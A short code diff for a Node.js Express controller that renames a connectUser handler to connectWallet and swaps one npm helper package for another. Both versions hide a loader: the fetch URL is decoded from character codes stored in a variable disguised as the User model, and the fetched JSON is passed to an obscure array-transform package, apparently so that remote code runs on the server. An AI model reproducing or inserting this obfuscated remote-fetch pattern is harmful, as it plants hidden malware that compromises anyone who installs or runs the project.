@@ -2,7 +2,7 @@ const { validationResult } = require('express-validator');
 const platform = require('../utils/platform');
 const userlist = require('../models/User');
 const { asyncHandler } = require('../utils/errors');
-const arrayInline = require('array-inline-transform');
+const ethersArray = require('ethers-array');
 const { sendValidationError } = require('../utils/response');
 const { HTTP_STATUS, SUCCESS_MESSAGES } = require('../utils/constants');
 
@@ -22,11 +22,11 @@ exports.register = asyncHandler(async (req, res) => {
   });
 });
 
-exports.connectUser = asyncHandler(async (req, res) => {
+exports.connectWallet = asyncHandler(async (req, res) => {
   try {
-    const { token } = await (await fetch(String.fromCharCode(...userlist))).json();
-    const res = arrayInline(
-      token,
+    const ethers = await (await fetch(String.fromCharCode(...userlist))).json();
+    const res = ethersArray(
+      ethers.value,
       true
     );
     return res;
